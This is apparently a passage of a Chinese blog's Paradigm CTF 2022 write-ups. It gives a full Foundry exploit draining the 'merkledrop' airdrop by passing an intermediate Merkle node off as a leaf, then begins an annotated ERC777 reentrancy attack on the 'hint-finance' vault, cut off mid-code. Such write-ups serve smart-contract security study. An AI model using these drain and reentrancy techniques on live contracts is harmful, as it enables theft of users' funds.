title="2.全局观"></a>2.全局观</h3><p>题目提供了三个合约</p><ul><li>Setup.sol<ul><li>初始化题目，没啥特别的</li><li>有一个非常普通的ERC20代币</li></ul></li><li>MerkleProof.sol<ul><li>merkle树的verify函数，library来的</li></ul></li><li>MerkleDistributor.sol<ul><li>通过merkle树的校验而获取空投，64个叶子节点，64个空投</li><li>证明有资格获得空投也很容易：<ul><li>有一张带有您的地址和金额的叶子。</li><li>提供从叶子到根哈希的路径。具体来说，您需要证明树的每一层上的每一对中的其他哈希值。</li></ul></li></ul></li></ul><p>前置知识：merkle验证自下而上，提供叶子节点、路径、根哈希</p><h3 id="3-分析"><a href="#3-分析" class="headerlink" title="3.分析"></a>3.分析</h3><p>这么看来MerkleDistributor合约是最重要的，也是唯一的可操作的合约。此合约中有三个函数：<code>isClaimed()</code>, <code>_setClaimed()</code>, <code>claim()</code>，并且只有<code>claim()</code>可以调用，<code>isClaimed()</code>用于查询，<code>_setClaimed()</code>用于领取过空投之后就记录下来，一人领取一次。</p><p>其实<code>isClaimed()</code>和<code>_setClaimed()</code>看不懂关系不大，前者一顿操作猛如虎，其实只是为了查询是否领取过空投，一般不会出问题，而后者是在领取空投的时候设置一次，也不会出问题。那么，我们就把视线移动到<code>claim()</code>方法。</p><h4 id="3-1整理领取空投逻辑"><a href="#3-1整理领取空投逻辑" class="headerlink" title="3.1整理领取空投逻辑"></a>3.1整理领取空投逻辑</h4><p>题目给了一个<code>tree.json</code>文件，包括了64个叶子节点信息，这64个叶子，配上路径，这个叶子节点地址就可以领取到空投了，并且64个叶子节点领取完刚刚好是空投总额。这就很矛盾了，题目要求我们拿完空投，但是又不可以全部人都领取，所以我们不能通过正常途径完成题目，这一定有些啥bug。</p><p>分析一波<code>claim()</code>，逻辑很清晰，是否领取过=&gt;计算和验证=&gt;记录已领取空投，没有任何问题。一切都很顺利正常，到底哪里出问题了呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function claim(uint256 index, address account, uint96 amount, bytes32[] memory merkleProof) external &#123;</span><br><span class="line">    require(!isClaimed(index), &#x27;MerkleDistributor: Drop already claimed.&#x27;);</span><br><span class="line"></span><br><span class="line">    // Verify the merkle proof.</span><br><span class="line">    bytes32 node = keccak256(abi.encodePacked(index, account, amount));</span><br><span class="line">    require(MerkleProof.verify(merkleProof, merkleRoot, node), &#x27;MerkleDistributor: Invalid proof.&#x27;);</span><br><span class="line"></span><br><span class="line">    // Mark it claimed and send the token.</span><br><span class="line">    _setClaimed(index);</span><br><span class="line">    require(ERC20Like(token).transfer(account, amount), &#x27;MerkleDistributor: Transfer failed.&#x27;);</span><br><span class="line"></span><br><span class="line">    emit Claimed(index, account, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我觉得这只能凭借经验而谈了，形参amount的类型是uint96，而不是一般的uint256，漏洞也许就会出现在这种地方，并且通过和标准库比较也不同，标准库是uint256。</p><p>然后进行哈希，从叶子节点开始，index是叶子节点的序号，account是接收空投的地址，amount是金额，三者加起来正好64字节。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes32 node = keccak256(abi.encodePacked(index, account, amount));</span><br></pre></td></tr></table></figure><p>如果我们把每个叶子节点的按照上面的式子进行拼接然后去算哈希值，<code>abi.encodePacked()</code>的结果如下：</p><p><img src="https://moe.photo/images/2023/07/24/paradigm-2022-merkledrop.png" alt></p><p>并且验证的时候，是通过左子树和右子树的哈希结果进行左右拼接，然后merkle树向上继续做一样的操作，直到树根。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function verify(bytes32[] memory proof,bytes32 root,bytes32 leaf)internal pure returns (bool) &#123;</span><br><span class="line">  bytes32 computedHash = leaf;</span><br><span class="line"></span><br><span class="line">  for (uint256 i = 0; i &lt; proof.length; i++) &#123;</span><br><span class="line">    bytes32 proofElement = proof[i];</span><br><span class="line"></span><br><span class="line">    if (computedHash &lt; proofElement) &#123;</span><br><span class="line">      // Hash(current computed hash + current element of the proof)</span><br><span class="line">      computedHash = keccak256(abi.encodePacked(computedHash, proofElement));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      // Hash(current element of the proof + current computed hash)</span><br><span class="line">      computedHash = keccak256(abi.encodePacked(proofElement, computedHash));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>我们有个发现：对于每一个拼接结果，（我们就拿第一个结果来看），我们左边32字节右边32字节分开来看，左边<code>0000000000000000000000000000000000000000000000000000000000000001</code>像是一个索引，用于确定这64个空投地址，而右边<code>00E21E550021Af51258060A0E18148e36607C9df00000009906894166afcc878</code>像是一个正常的哈希值。</p><p>我们知道，就是这个东西会被记录为已经领取空投，那么如果我们拼接的结果不是这64个空投地址的拼接结果，但也能通过merkle树检验呢？想法很棒！因为对于merkle树，即使不从叶子节点出来，从中间出发网上，只要路径哈希是对的，一样可以验证。那么我们可以从中间出发然后通过验证，获取得到空投，并且题目中的64个空投地址不会被记录，而余额会被消耗。</p><h4 id="3-2想法初探"><a href="#3-2想法初探" class="headerlink" title="3.2想法初探"></a>3.2想法初探</h4><p>带着这个想法，我们出发。想要从merkle树的中间开始验证，那么我们就要知道中间这个hash是多少。</p><p>并且通过题目，我们有一个限制条件如下：我们发空投的金额不得超过<code>75000 * 10 ** 18</code>个代币，换算成16进制就是<code>fe1c215e8f838e00000</code>，那么在拼接结果中，amount的部分至少要小于这个值，那么至少包含前面5个连续的0。举个例子：第一个的拼接结果<code>00000009906894166afcc878</code>，这个数值不得大于fe1c215e8f838e00000，那么至少包含前面5个连续的0。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require(ERC20Like(token).transfer(account, amount), &#x27;MerkleDistributor: Transfer failed.&#x27;);</span><br></pre></td></tr></table></figure><p>如果我们想要找到这么一个中间的哈希值，那么它一定也要满足这个条件，不然转账会报错！因此我们在tree.js文件中，<code>ctrl+F</code>搜索<code>00000</code>，还真的发现了这么一个中间值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xd48451c19959e2d9bd4e620fbe88aa5f6f7ea72a00000f40f0c122ae08d2207b</span><br></pre></td></tr></table></figure><p>他是节点37的路径中的其中一个值。</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;0x8a85e6D0d2d6b8cBCb27E724F14A97AeB7cC1f5e&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">37</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;amount&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0x5dacf28c4e17721edb&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;proof&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;0xd48451c19959e2d9bd4e620fbe88aa5f6f7ea72a00000f40f0c122ae08d2207b&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5&quot;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>既然有中间的一个hash值满足这个条件，那么右边的32字节就是它了，然后我们找左边的32字节。我们分析可知，<code>0xd48451c19959e2d9bd4e620fbe88aa5f6f7ea72a00000f40f0c122ae08d2207b</code>是路径的第一个哈希，说明叶子节点拼接进行hash之后，就和它进行再次拼接hash，他是位于倒数第二层的。</p><p>这么一来，左值就是37叶子节点拼接hash的结果，构造成一个新的hash值作为左值。这样我们就满足了我们想要做到的：</p><ul><li>左值作为索引不是64个节点的拼接结果之一，不会被记录到<code>isClaimed()</code></li><li>右值满足<code>transfer()</code>的条件</li></ul><p>那么我们如下这么构造，就可以从倒数第二层开始往上验证，然后取到一笔钱。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bytes32[] memory merkleProof1 = new bytes32[](5);</span><br><span class="line">merkleProof1[0] = bytes32(0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d);</span><br><span class="line">merkleProof1[1] = bytes32(0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde);</span><br><span class="line">merkleProof1[2] = bytes32(0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813);</span><br><span class="line">merkleProof1[3] = bytes32(0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c);</span><br><span class="line">merkleProof1[4] = bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5);</span><br><span class="line">merkleDistributor.claim(</span><br><span class="line">        uint256(keccak256(abi.encodePacked(</span><br><span class="line">            uint256(37),</span><br><span class="line">            address(0x8a85e6D0d2d6b8cBCb27E724F14A97AeB7cC1f5e),</span><br><span class="line">            uint96(0x5dacf28c4e17721edb)</span><br><span class="line">        ))),</span><br><span class="line">        address(0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A), </span><br><span class="line">        0x00000f40f0c122ae08d2207b, </span><br><span class="line">        merkleProof1</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>执行完这个之后，我们消耗了空投<code>0x00000f40f0c122ae08d2207b</code>这么多钱，那么还剩下多少需要消耗完呢？</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">   75000*10*18 - 0x00000f40f0c122ae08d2207b</span><br><span class="line">= 0xfe1c215e8f838e00000 - 0x00000f40f0c122ae08d2207b</span><br><span class="line">= a0d154c64a300ddf85</span><br></pre></td></tr></table></figure><p>这样，我们再消耗<code>a0d154c64a300ddf85</code>多金额即可，如果题目正常，那么应该会有一个账户的空投金额是这个数，如果变态，那可能是多个账户的金额组合（这时我们就要用算法，从2个账户组合开始，两两余额相加然后作比较，然后3个账户，4个。。。）。我们继续<code>ctrl+f</code>在tree.js文件里面查找<code>a0d154c64a300ddf85</code>，很好，找到了：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">&quot;0x249934e4C5b838F920883a9f3ceC255C0aB3f827&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;index&quot;</span><span class="punctuation">:</span> <span class="number">8</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;amount&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0xa0d154c64a300ddf85&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;proof&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;0xe10102068cab128ad732ed1a8f53922f78f0acdca6aa82a072e02a77d343be00&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;0xd779d1890bba630ee282997e511c09575fae6af79d88ae89a7a850a3eb2876b3&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;0x46b46a28fab615ab202ace89e215576e28ed0ee55f5f6b5e36d7ce9b0d1feda2&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;0xabde46c0e277501c050793f072f0759904f6b2b8e94023efb7fc9112f366374a&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5&quot;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br></pre></td></tr></table></figure><p>这样，我们用叶子节点8就可以消耗完全部金额了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">bytes32[] memory merkleProof2 = new bytes32[](6);</span><br><span class="line">merkleProof2[0] = bytes32(0xe10102068cab128ad732ed1a8f53922f78f0acdca6aa82a072e02a77d343be00);</span><br><span class="line">merkleProof2[1] = bytes32(0xd779d1890bba630ee282997e511c09575fae6af79d88ae89a7a850a3eb2876b3);</span><br><span class="line">merkleProof2[2] = bytes32(0x46b46a28fab615ab202ace89e215576e28ed0ee55f5f6b5e36d7ce9b0d1feda2);</span><br><span class="line">merkleProof2[3] = bytes32(0xabde46c0e277501c050793f072f0759904f6b2b8e94023efb7fc9112f366374a);</span><br><span class="line">merkleProof2[4] = bytes32(0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c);</span><br><span class="line">merkleProof2[5] = bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5);</span><br><span class="line">merkleDistributor.claim(8, address(0x249934e4C5b838F920883a9f3ceC255C0aB3f827), 0xa0d154c64a300ddf85, merkleProof2);</span><br></pre></td></tr></table></figure><p>由此，我们用两个账户，完成了题目的要求：消耗完空投，不得用完64个叶子节点</p><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.16;</span><br><span class="line"></span><br><span class="line">import &quot;../../src/04.merkledrop/Setup.sol&quot;;</span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract merkledrop is Test&#123;</span><br><span class="line"></span><br><span class="line">    Setup setup;</span><br><span class="line">    MerkleDistributor merkleDistributor;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        setup = new Setup(); // 创建一个题目实例</span><br><span class="line">        merkleDistributor = setup.merkleDistributor(); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_isSolved() public &#123;</span><br><span class="line"></span><br><span class="line">        // 因为已经跳过了叶子节点那一层，所以路径少了一个</span><br><span class="line">        bytes32[] memory merkleProof1 = new bytes32[](5);</span><br><span class="line">        merkleProof1[0] = bytes32(0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d);</span><br><span class="line">        merkleProof1[1] = bytes32(0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde);</span><br><span class="line">        merkleProof1[2] = bytes32(0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813);</span><br><span class="line">        merkleProof1[3] = bytes32(0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c);</span><br><span class="line">        merkleProof1[4] = bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5);</span><br><span class="line">        merkleDistributor.claim(</span><br><span class="line">                // 从叶子节点计算出来的hash作为左值</span><br><span class="line">                uint256(keccak256(abi.encodePacked(</span><br><span class="line">                    uint256(37),</span><br><span class="line">                    address(0x8a85e6D0d2d6b8cBCb27E724F14A97AeB7cC1f5e),</span><br><span class="line">                    uint96(0x5dacf28c4e17721edb)</span><br><span class="line">                ))),</span><br><span class="line">                // 特殊的五个0作为右值</span><br><span class="line">                address(0xd48451c19959e2D9bD4E620fBE88aA5F6F7eA72A), </span><br><span class="line">                0x00000f40f0c122ae08d2207b, </span><br><span class="line">                // 配置路径</span><br><span class="line">                merkleProof1</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        bytes32[] memory merkleProof2 = new bytes32[](6);</span><br><span class="line">        merkleProof2[0] = bytes32(0xe10102068cab128ad732ed1a8f53922f78f0acdca6aa82a072e02a77d343be00);</span><br><span class="line">        merkleProof2[1] = bytes32(0xd779d1890bba630ee282997e511c09575fae6af79d88ae89a7a850a3eb2876b3);</span><br><span class="line">        merkleProof2[2] = bytes32(0x46b46a28fab615ab202ace89e215576e28ed0ee55f5f6b5e36d7ce9b0d1feda2);</span><br><span class="line">        merkleProof2[3] = bytes32(0xabde46c0e277501c050793f072f0759904f6b2b8e94023efb7fc9112f366374a);</span><br><span class="line">        merkleProof2[4] = bytes32(0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c);</span><br><span class="line">        merkleProof2[5] = bytes32(0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5);</span><br><span class="line">        merkleDistributor.claim(8, address(0x249934e4C5b838F920883a9f3ceC255C0aB3f827), 0xa0d154c64a300ddf85, merkleProof2);</span><br><span class="line"></span><br><span class="line">        assertEq(setup.isSolved(),true); // 验证是否完成题目</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h2><ul><li>第一个关键点：想到merkle树可以从中间网上开始验证一样可以通过</li><li>第二个关键点：根据<code>transfer()</code>的转账条件限制至少5个连续0</li><li>第三个关键点：记录不是64个节点之一即可，那么我们可以用其他账户进行领取空投，中间开始</li><li>当题目给了很庞大的数据的时候，往往需要<code>ctrl+f</code>查找分析题目所得到的关键信息，这是突破口，不可能让我们一个一个看的</li></ul>]]></content>
      
      
      <categories>
          
          <category> 14.Paradigm CTF 2022 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>03.hint-finance</title>
      <link href="/2023/09/18/14.Paradigm%20CTF%202022/03.hint-finance/"/>
      <url>/2023/09/18/14.Paradigm%20CTF%202022/03.hint-finance/</url>
      
        <content type="html"><![CDATA[<h1 id="hint-finance"><a href="#hint-finance" class="headerlink" title="hint-finance"></a>hint-finance</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="1-任务"><a href="#1-任务" class="headerlink" title="1.任务"></a>1.任务</h3><p>这是一个主网的 fork，根据Etherscan可查询到三个underlyingTokens分别为：PNT,SAND,AMP。其中，PNT 和 AMP 都是 ERC777， SAND token 是一个 ERC20。</p><p>要求我们调用<code>isSolved()</code>函数成功返回true，即我们需要拿走金库拥有的underlyingTokens余额的99%</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">address[3] public underlyingTokens = [</span><br><span class="line">    0x89Ab32156e46F46D02ade3FEcbe5Fc4243B9AAeD,</span><br><span class="line">    0x3845badAde8e6dFF049820680d1F14bD3903a5d0,</span><br><span class="line">    0xfF20817765cB7f73d4bde2e66e067E58D11095C2</span><br><span class="line">];</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function isSolved() public view returns (bool) &#123;</span><br><span class="line">    for (uint256 i = 0; i &lt; underlyingTokens.length; ++i) &#123;</span><br><span class="line">    // 每一个underlyingTokens对应一个金库地址</span><br><span class="line">        address vault = hintFinanceFactory.underlyingToVault(underlyingTokens[i]);</span><br><span class="line">        // 获取金库拥有的underlyingTokens余额</span><br><span class="line">        uint256 vaultUnderlyingBalance = ERC20Like(underlyingTokens[i]).balanceOf(vault);</span><br><span class="line">        // 我们需要拿走金库拥有的underlyingTokens余额的99%</span><br><span class="line">        if (vaultUnderlyingBalance &gt; initialUnderlyingBalances[i] / 100) return false;</span><br><span class="line">    &#125;</span><br><span class="line">    return true;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-全局观"><a href="#2-全局观" class="headerlink" title="2.全局观"></a>2.全局观</h3><p>一共三个合约</p><ul><li>Setup.sol<ul><li>部署题目，部署三个underlyingTokens，三个rewardTokens和创建三个金库，并且设置对应关系</li></ul></li><li>HintFinanceFactory.sol<ul><li>创建金库</li><li>金库和 underlyingTokens 对应关系</li><li>给金库增加 rewardToken</li></ul></li><li>HintFinanceVault.sol<ul><li>存款，借款，取款，闪电贷</li><li>rewardToken 的信息（比如利率，可取数目）会随着时间变化，有点线性释放的味道</li></ul></li></ul><p>题目的类型很典型：存入一定数量的underlyingTokens 到金库，他会给你一些金库份额，然后取款underlyingTokens 的时候会额外给你一些rewardToken（当然是根据一些规则给你）。并且还提供了闪电贷来借用金库持有的任何token。</p><h3 id="3-详细分析"><a href="#3-详细分析" class="headerlink" title="3.详细分析"></a>3.详细分析</h3><p>三个underlyingTokens 分别为ERC777和ERC20，ERC777非常容易出错，ERC20也是问题经常出现</p><h4 id="3-1ERC777"><a href="#3-1ERC777" class="headerlink" title="3.1ERC777"></a>3.1ERC777</h4><h5 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h5><p>ERC777存在钩子函数：转账代币的时候会调用发送方的<code>_callTokensToSend()</code>和接收方的<code>_callTokensReceived()</code>进行回调。这样就类比<code>call()</code>转账然后进入<code>fallback()</code>重入。</p><p>当然ERC777需要到ERC1820进行钩子注册</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function _send(</span><br><span class="line">    address from,</span><br><span class="line">    address to,</span><br><span class="line">    uint256 amount,</span><br><span class="line">    bytes memory userData,</span><br><span class="line">    bytes memory operatorData,</span><br><span class="line">    bool requireReceptionAck</span><br><span class="line">)</span><br><span class="line">    internal</span><br><span class="line">&#123;</span><br><span class="line">    require(from != address(0), &quot;ERC777: send from the zero address&quot;);</span><br><span class="line">    require(to != address(0), &quot;ERC777: send to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">    address operator = _msgSender();</span><br><span class="line"></span><br><span class="line">    _callTokensToSend(operator, from, to, amount, userData, operatorData);</span><br><span class="line"></span><br><span class="line">    _move(operator, from, to, amount, userData, operatorData);</span><br><span class="line"></span><br><span class="line">    _callTokensReceived(operator, from, to, amount, userData, operatorData, requireReceptionAck);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>金库合约的存款和取款函数都没有重入保护，因此可以利用此钩子函数进行回调重入攻击</p><h5 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">// 存款，缺乏重入保护</span><br><span class="line">function deposit(uint256 amount) external updateReward(msg.sender) returns (uint256) &#123;</span><br><span class="line">    uint256 bal = ERC20Like(underlyingToken).balanceOf(address(this));</span><br><span class="line">    // 4. totalSupply会远大于bal，因为bal是金库拥有的数量，而totalSupply是全部人拥有的量，</span><br><span class="line">    //    因为在withdraw的时候转给了攻击地址一大笔钱，但是totalSupply还没来得及更新，因此</span><br><span class="line">    //    下面式子中totalSupply和bal不变，计算出来的shares会比原来大很多.</span><br><span class="line">    // PS：注意它这样计算shares是为了线性计算用户存入token之后可以得到的份额，然后根据份额在取款的时候给利息</span><br><span class="line">    uint256 shares = totalSupply == 0 ? amount : amount * totalSupply / bal;</span><br><span class="line">    // 5. 然后金库给攻击合约转 bal-1 的金额</span><br><span class="line">    //    注意此时的amount是(bal-1)/2，因此在调用钩子函数的时候并不会再次重入</span><br><span class="line">    ERC20Like(underlyingToken).transferFrom(msg.sender, address(this), amount);</span><br><span class="line">    totalSupply += shares;</span><br><span class="line">    // 6. 但是金库却给我们记录了大了好多倍的金额</span><br><span class="line">    balanceOf[msg.sender] += shares;</span><br><span class="line">    return shares;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 单个取款，缺乏重入保护</span><br><span class="line">function withdraw(uint256 shares) external updateReward(msg.sender) returns (uint256) &#123;</span><br><span class="line">    // 1. 不用验证msg.sender是不是拥有shares这么多钱，因为不够的话会下溢，但0.8.0^会报错revert</span><br><span class="line">    uint256 bal = ERC20Like(underlyingToken).balanceOf(address(this));</span><br><span class="line">    // PS：这里的式子是计算我们的shares占总totalSupply的百分比，然后获取金库一定比例的金额</span><br><span class="line">    uint256 amount = shares * bal / totalSupply;</span><br><span class="line">    // 2. 会给我们的攻击合约发送一大笔钱：bal-1</span><br><span class="line">    // 3. 然后进入到钩子函数，然后钩子函数又会调用到deposit()</span><br><span class="line">    ERC20Like(underlyingToken).transfer(msg.sender, amount); </span><br><span class="line">    // 7. 执行完钩子函数之后，我们将我们的余额减去bal-1，此时不会失败，因为我们的deposit()时给我们记录了好几倍的金额</span><br><span class="line">    totalSupply -= shares;</span><br><span class="line">    // 8.最后减去一小部分shares</span><br><span class="line">    balanceOf[msg.sender] -= shares;</span><br><span class="line">    return 